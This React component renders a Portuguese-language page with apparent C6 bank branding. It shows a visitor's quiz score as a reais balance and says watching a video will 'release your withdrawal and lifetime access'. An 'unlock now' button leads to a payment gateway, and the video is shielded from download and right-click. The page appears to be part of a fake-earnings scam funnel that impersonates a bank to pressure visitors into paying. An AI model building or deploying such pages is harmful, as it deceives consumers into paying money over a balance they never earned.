import { useNavigate } from 'react-router-dom';

import Iconc6Payment from '../../assets/c6/c6icon.svg';
import { useAppContext } from '../../context/AppContext';

export function PaymentVideo() {
  const { quizScore } = useAppContext()
  const navigate = useNavigate();

  return (
    <main className="bg-[#121212] antialiased">
      <header className="bg-[#FBC161]">
        <h1 className="text-[#121212] text-center py-4 text-[1rem] font-c6text-bold font-bold px-6">
          ASSISTA O VÍDEO ABAIXO PARA LIBERAR SEU SAQUE E ACESSO VITALÍCIO.
        </h1>
      </header>
      <section className="flex items-center justify-between px-6 py-4 mt-2 ">
        <img src={Iconc6Payment} width={70} height={70} />
        <div className="w-32">
          <p className="border py-3 rounded-lg text-[#f4f4f4] text-center text-[1rem]">
            R$ {Number(quizScore).toFixed(2).replace('.', ',')}
          </p>
        </div>
      </section>

      <div className="self-center px-6 py-4">
        <div className="border-b-[0.1rem] border-[#777676]" />
      </div>
      <h1 className="text-[#FBC161] font-bold font-c6text-bold text-center text-[1.2rem]">DESBLOQUEIO DE SALDO</h1>
      <p className="text-[#d3d3d3] text-center px-8 pt-2">Veja como liberar seu saque assistindo ao video.</p>
      <section className="flex justify-center mt-2 px-6 ">
        <video
          src="/C1.mp4"
          controls
          controlsList="nodownload"
          loop
          playsInline
          className="w-full max-w-3xl border border-gray-700 rounded-lg"
          onContextMenu={(e) => e.preventDefault()}
        />
      </section>
      <div className="px-6">
        <button onClick={() => navigate('/gateway')} className="bg-[#FBC161] w-full px-6 py-4 rounded-lg mt-10 font-c6text-bold font-bold text-[1rem]">
          Desbloquear agora <b> R$ {Number(quizScore)?.toFixed(2)?.replace(',', '.')}</b>

        </button>

      </div>

    </main>
  );
}
